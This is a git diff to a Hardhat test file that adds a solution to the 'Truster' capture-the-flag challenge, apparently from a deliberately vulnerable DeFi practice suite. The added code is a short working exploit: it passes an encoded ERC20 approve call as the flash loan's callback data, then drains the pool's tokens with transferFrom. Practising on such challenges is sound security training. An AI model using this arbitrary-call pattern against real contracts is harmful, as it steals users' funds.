@@ -1,5 +1,6 @@
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
+const { hexStripZeros } = require('ethers/lib/utils');
 
 describe('[Challenge] Truster', function () {
     let deployer, attacker;
@@ -29,6 +30,17 @@ describe('[Challenge] Truster', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE  */
+        // console.log('token', this.token.address)
+        // console.log('pool', this.pool.address)
+        // console.log('attacker', attacker.address)
+
+        const ABI = ["function approve(address spender, uint256 amount)"];
+        const iface = new ethers.utils.Interface(ABI);
+        const data = iface.encodeFunctionData("approve", [attacker.address, TOKENS_IN_POOL]);
+
+        // console.log('data', data)
+        this.pool.connect(attacker).flashLoan(0, attacker.address, this.token.address, data);
+        this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL);
     });
 
     after(async function () {
